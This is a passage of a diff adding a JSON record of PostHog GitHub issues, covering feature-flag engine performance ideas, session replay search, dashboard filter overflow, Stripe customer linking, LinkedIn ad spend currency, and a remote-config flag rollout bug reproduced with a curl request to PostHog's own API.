re-parsing `serde_json::Value` on every evaluation. Regex compilation in particular is orders of magnitude slower than matching.\n- **String interning**: Replace `HashMap<String, Value>` property lookups with `HashMap<u32, _>` using interned keys. Integer hashing is significantly cheaper than string hashing.\n- **Archetype-based flag grouping**: Classify flags by evaluation complexity (simple rollout, property-filtered, cohort-based, etc.) and process each group with a specialized loop to reduce branching.\n- **Vectorized batch evaluation**: Evaluate all property filters in a single forward pass over contiguous memory (database-style columnar processing) instead of one-flag-at-a-time.\n- **Hot/cold data splitting**: Separate frequently-accessed flag fields from rarely-accessed ones so the evaluation loop loads fewer cache lines per iteration.\n- **Bump allocation for per-request temporaries**: Use an arena allocator for short-lived evaluation state instead of individual heap allocations.",
+    "html_url": "https://github.com/PostHog/posthog/issues/52017",
+    "labels": [
+      "enhancement"
+    ],
+    "state": "open",
+    "title": "Explore Data Oriented Design optimizations for the feature-flags evaluation engine"
+  },
+  "PostHog/posthog#52027": {
+    "body": "### Feature request\n\n## Is your feature request related to a problem?\nCurrently, when viewing a session replay recording with the inspector open, searching in the inspector search field for the name (key) of a feature flag does not return `Feature flag called` events which do include the feature flag.\n## Describe the solution you'd like\nAllow the inspector search field to return events containing a feature flag name when a feature flag name (key) is entered into the inspector's seearch field.\n## Describe alternatives you've considered\nn/a\n\n## Additional context\nFrom https://posthoghelp.zendesk.com/agent/tickets/54072\n\n\n### Debug info\n\n```shell\nSession: https://us.posthog.com/project/sTMFPsFhdP1Ssg/replay/019d1d1c-13b3-76e6-bdb2-3e121d986ca1?t=452\nAdmin: http://go/adminOrgUS/018de32d-a91e-0000-2c11-79e7b69ef985 (project ID 55348)\n```",
+    "html_url": "https://github.com/PostHog/posthog/issues/52027",
+    "labels": [
+      "enhancement",
+      "feature/replay",
+      "team/session-replay"
+    ],
+    "state": "closed",
+    "title": "Feature request: Filter session replay inspector by feature flag name"
+  },
+  "PostHog/posthog#52047": {
+    "body": "What: \n    Dashboard filter bar doesn't scroll horizontally when multiple filters are added \u2014 filters overflow off-screen and are only visible by zooming out the browser\n\nWhere: \n    Dashboard view, global filters bar at the top\nSteps to reproduce: \n    Add 4+ filters to a dashboard \u2192 filters overflow with no scroll\n\nExpected: \n    Filter bar scrolls horizontally (or wraps) to show all filters\n\nBrowser/OS: \n    e.g. Chrome 146 on macOS",
+    "html_url": "https://github.com/PostHog/posthog/issues/52047",
+    "labels": [
+      "feature/dashboards",
+      "team/analytics-platform"
+    ],
+    "state": "closed",
+    "title": "Dashboard global filter bar doesn't scroll horizontally when multiple filters are added"
+  },
+  "PostHog/posthog#52270": {
+    "body": "**Problem:** The customer-to-person matching workflow is unclear, manual, and limited in SQL expression support. Users expect this to work automatically since they've connected Stripe.\n \n**Idea:** Standardize the way we link persons to revenue data, by requiring `distinctId` to be passed into Stripe metadata field and doing the join ourselves, always using this field.\n\n**Implementation:**\n\n- [x] Create the join automatically on first Stripe sync\n- [ ] Create the join automatically on Revenue analytics enablement\n \t- In case the Stripe source already exists, this covers the gap\n- [ ] Update docs to guide users to update their `customer.create` Stripe calls\n- [ ] Update docs to guide users to add a `customer.update` call alongside where their charge is made\n- [ ] Add wizard method to introspect codebase, identify Stripe calls, identify what they're using as distinct id and update the code accordingly",
+    "html_url": "https://github.com/PostHog/posthog/issues/52270",
+    "labels": [],
+    "state": "open",
+    "title": "3.5 Connecting Stripe customers to PostHog persons/groups is confusing"
+  },
+  "PostHog/posthog#52911": {
+    "body": "### Feature request\n\n## Is your feature request related to a problem?\n\nWe seem to only store LinkedIn ad spend in USD. But LinkedIn also includes `costInLocalCurrency` in the data if a customer wanted to see the spend in their local currency without conversion.\n\n## Describe the solution you'd like\n\nAdd `costInLocalCurrency` in `campaign_stats` and `campaign_group_stats`\n\n## Describe alternatives you've considered\n\nConversion is cumbersome and not going to be accurate as values fluctuate.\n\n## Additional context\n\nTicket: https://posthoghelp.zendesk.com/agent/tickets/54767\n\n\n\n### Debug info\n\n```shell\n- [x] PostHog Cloud, Debug information: [please copy/paste from https://us.posthog.com/settings/project-details#variables]\n- [ ] PostHog Hobby self-hosted with `docker compose`, version/commit: [please provide]\n- [ ] PostHog self-hosted with Kubernetes (deprecated, see [`Sunsetting Kubernetes support`](https://posthog.com/blog/sunsetting-helm-support-posthog)), version/commit: [please provide]\n```",
+    "html_url": "https://github.com/PostHog/posthog/issues/52911",
+    "labels": [
+      "enhancement",
+      "team/data-warehouse",
+      "feature/pipelines",
+      "feature/data-warehouse"
+    ],
+    "state": "open",
+    "title": "Add costInLocalCurrency to LinkedIn Source Schema"
+  },
+  "PostHog/posthog#53073": {
+    "body": "### Bug Description\n\nIt seems like if we create a remote config flag it sets to 0% rollout and will fail.\n\nI curled the flag:\n\n```\ncurl -X POST 'https://us.posthog.com/flags/?v=2' \\\n    -H 'Content-Type: application/json' \\\n    -d '{\n      \"api_key\": \"snip\",\n      \"distinct_id\": \"kyle\",\n      \"flag_keys\": [\"kyle-test-remote-config\"]\n    }'\n{\"errorsWhileComputingFlags\":false,\"flags\":{\"kyle-test-remote-config\":{\"key\":\"kyle-test-remote-config\",\"enabled\":false,\"variant\":null,\"reason\":{\"code\":\"out_of_rollout_bound\",\"condition_index\":0,\"description\":\"Out of rollout bound\"},\"metadata\":{\"id\":625755,\"version\":3,\"description\":null,\"payload\":null}}},\"requestId\":\"eaa6b1fb-01a0-481a-abd9-bcf724464258\",\"evaluatedAt\":1775060266175}\n```\n\nLooking at the filters in the database:\n\n```\n{\"groups\": [{\"variant\": null, \"properties\": [], \"rollout_percentage\": 0, \"aggregation_group_type_index\": null}], \"payloads\": {\"true\": \"\\\"test\\\"\"}, \"multivariate\": null, \"aggregation_group_type_index\": null}\n```\n\n## How to reproduce\n\n1. Create a new remote config flag and set the payload\n2. Query the flag's payload\n3. Get false/undefined/nil for the results\n\n## Additional context\n\nIf I convert to boolean flag, set the rollout to 100%, then save, then convert back to a remote config flag. It works properly.\n\nTicket: https://posthoghelp.zendesk.com/agent/tickets/54525\n\n### Debug info\n\n```shell\n- [x] PostHog Cloud, Debug information: [please copy/paste from https://us.posthog.com/settings/project-details#variables or https://eu.posthog.com/settings/project-details#variables]\n- [ ] PostHog Hobby self-hosted with `docker compose`, version/commit: [please provide]\n- [ ] PostHog self-hosted with Kubernetes (deprecated, see [`Sunsetting Kubernetes support`](https://posthog.com/blog/sunsetting-helm-support-posthog)), version/commit: [please provide]\n```",
+    "html_url": "https://github.com/PostHog/posthog/issues/53073",
+    "labels": [
+      "bug",
+      "feature/feature-flags",
+      "team/feature-flags"
+    ],
+    "state": "closed",
+    "title": "Remote Config Flags Default to 0% rollout"
+  }
+}
